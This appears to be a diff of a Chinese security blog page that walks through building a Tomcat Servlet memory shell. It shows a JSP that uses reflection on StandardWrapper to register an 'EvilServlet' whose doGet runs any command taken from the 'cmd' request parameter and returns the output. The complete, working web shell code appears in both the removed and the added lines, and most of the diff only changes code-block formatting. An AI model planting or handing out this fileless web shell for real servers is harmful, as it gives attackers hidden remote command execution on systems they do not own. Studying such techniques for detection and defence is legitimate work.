@@ -100,10 +100,6 @@
           <a href="/friends/">Friends</a>
         </li>
       
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
     </ul>
   </div>
 </div>
@@ -214,15 +210,8 @@
 <h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
 <p>同时在web.xml中添加上</p>
-<pre><code class="xml">    &lt;servlet&gt;
-        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
-        &lt;servlet-class&gt;HomeServlet&lt;/servlet-class&gt;
-    &lt;/servlet&gt;
-    &lt;servlet-mapping&gt;
-        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
-        &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
-    &lt;/servlet-mapping&gt;
-</code></pre>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HomeServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/home<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
 <p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
@@ -233,89 +222,24 @@
 <p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
 <p>因此我们可以直接在jsp中进行获取。</p>
 <p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
-<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
 <p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
 <p>因此我们可以用反射的方法来获取到context</p>
-<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>获取到standardWrapper后，就可以设置相应的servlet了</p>
-<pre><code class="java">stdWrapper.setServlet(new EvilServlet());
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
 <p>因此完整的注册内存马代码如下</p>
-<pre><code class="java">&lt;%
-  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-  stdWrapper.setServlet(new EvilServlet());
-%&gt;
-</code></pre>
-<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><pre><code class="java">  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
-    @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      super.doPost(req, resp);
-    &#125;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      String cmd = req.getParameter(&quot;cmd&quot;);
-      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-      int i=0;
-      byte[] bytes=new byte[1024];
-      while ((i=inputStream.read(bytes))!=-1)&#123;
-        resp.getWriter().write(new String(bytes,0,i));
-        resp.getWriter().write(&quot;\r\n&quot;);
-      &#125;
-    &#125;
-  &#125;
-</code></pre>
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapperFacade&quot; %&gt;
-&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
-&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%--
-  Created by IntelliJ IDEA.
-  User: leihehe
-  Date: 30/12/2021
-  Time: 09:22
-  To change this template use File | Settings | File Templates.
---%&gt;
-&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
-&lt;%!
-  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
-    @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      super.doPost(req, resp);
-    &#125;
+<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">      resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">      resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      String cmd = req.getParameter(&quot;cmd&quot;);
-      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-      int i=0;
-      byte[] bytes=new byte[1024];
-      while ((i=inputStream.read(bytes))!=-1)&#123;
-        resp.getWriter().write(new String(bytes,0,i));
-        resp.getWriter().write(&quot;\r\n&quot;);
-      &#125;
-    &#125;
-  &#125;
-%&gt;
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapperFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: leihehe</span><br><span class="line">  Date: <span class="number">30</span>/<span class="number">12</span>/<span class="number">2021</span></span><br><span class="line">  Time: 09:<span class="number">22</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">javax</span>.servlet.http.HttpServlet&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">      <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">      <span class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="keyword">while</span> ((i=inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">StandardWrapperFacade</span> <span class="variable">stdWrapperFacade</span> <span class="operator">=</span> (StandardWrapperFacade) config;</span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdWrapperField</span> <span class="operator">=</span> stdWrapperFacade.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">  stdWrapperField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardWrapper</span> <span class="variable">stdWrapper</span> <span class="operator">=</span> (StandardWrapper) stdWrapperField.get(stdWrapperFacade);</span><br><span class="line">  stdWrapper.setServlet(<span class="keyword">new</span> <span class="title class_">EvilServlet</span>());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-&lt;%
-  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-  stdWrapper.setServlet(new EvilServlet());
-%&gt;
-</code></pre>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
 
       </div>
